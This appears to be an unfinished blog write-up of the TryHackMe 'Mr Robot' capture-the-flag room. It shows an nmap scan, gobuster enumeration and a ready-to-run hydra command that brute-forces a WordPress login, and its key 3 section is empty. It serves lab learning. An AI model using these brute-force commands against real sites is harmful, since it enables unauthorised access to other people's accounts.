---
title: Box - Mr Robot CTF
published: true
---

Based on the Mr. Robot show, can you root this box?

[https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)

![](/assets/mrrobot01.jpg)

* * *

## [](#header-2)Hack the Machine

#### [](#header-4)Nmap Scans

- Discover open ports with ``nmap -Pn -sS -T5 10.10.122.32 -p- -vvv``
- We find ports 22,80,443
- Port 22/tcp  closed ssh      reset ttl 61

> Port 80/tcp  open   http     syn-ack ttl 61 Apache httpd
> http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
> http-title: Site doesn't have a title (text/html).
> http-methods: 
> Supported Methods: GET HEAD POST OPTIONS
> http-server-header: Apache

### [](#header-3)What is key 1?

- ``gobuster dir -u http://10.10.122.32/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x txt,html,php -t 100``
- Robots.txt

### [](#header-3)What is key 2?

- ``/wp-login.php`` we can brute force using the fsocity.dic found in robots.txt
- using foxyproxy and burpsuite we can capture what we need to generate our hydra code
- ``hydra -l elliot -P fsocity.dic 10.10.122.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=https%3A%2F%2F10.10.122.32%2Fwp-admin%2F&testcookie=1:is incorrect"``


### [](#header-3)What is key 3?




* * * 